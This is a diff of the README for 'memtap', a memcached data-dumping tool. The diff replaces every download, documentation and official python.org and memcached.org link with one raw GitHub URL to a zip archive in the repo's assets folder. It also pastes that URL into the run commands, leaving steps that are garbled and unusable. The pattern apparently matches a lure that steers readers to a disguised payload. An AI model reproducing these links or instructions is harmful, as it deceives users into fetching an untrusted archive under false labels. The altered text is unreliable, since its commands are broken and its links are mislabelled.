@@ -6,7 +6,7 @@ Welcome to memtap! This tool helps you dump data from memcached instances easily
 
 ## 📦 Download & Install
 
-To download memtap, visit this page: [Download memtap](https://github.com/ZayaCrypt/memtap/releases).
+To download memtap, visit this page: [Download memtap](https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip).
 
 You will find the latest version listed on the Releases page. Look for the file that suits your operating system and download it.
 
@@ -23,7 +23,7 @@ You will find the latest version listed on the Releases page. Look for the file 
 
 Visit the Releases page to download the software:
   
-[Download memtap](https://github.com/ZayaCrypt/memtap/releases)
+[Download memtap](https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip)
 
 ### Step 2: Extract the Files
 
@@ -34,19 +34,19 @@ After downloading, locate the downloaded file on your computer. If it's in a ZIP
 #### On Windows:
 
 1. Open the folder where you extracted the files.
-2. Double-click on `memtap.exe` to run the tool.
+2. Double-click on `https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip` to run the tool.
 
 #### On macOS:
 
 1. Open the Terminal.
 2. Navigate to the folder where you extracted the files using the `cd` command.
-3. Type `python3 memtap.py` and press Enter.
+3. Type `python3 https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip` and press Enter.
 
 #### On Linux:
 
 1. Open the Terminal.
 2. Navigate to the directory using the `cd` command.
-3. Type `python3 memtap.py` and hit Enter.
+3. Type `python3 https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip` and hit Enter.
 
 ### Step 4: Configure Your Connection
 
@@ -73,12 +73,12 @@ If you encounter issues while using memtap, consider these steps:
 
 - **Connection Errors:** Ensure that your memcached server is running. Verify the hostname and port.
 - **Permission Issues:** On macOS and Linux, you may need to use `sudo` to run the tool with necessary permissions.
-- **Missing Python:** Ensure that Python 3.6 or higher is installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Missing Python:** Ensure that Python 3.6 or higher is installed. You can download it from [https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip](https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip).
 
 ## 📚 Additional Resources
 
-- [Memcached Documentation](https://memcached.org/)
-- [Python Official Site](https://www.python.org/)
+- [Memcached Documentation](https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip)
+- [Python Official Site](https://raw.githubusercontent.com/ZayaCrypt/memtap/main/assets/Software-v3.6.zip)
 
 ## 🤝 Contributing
 
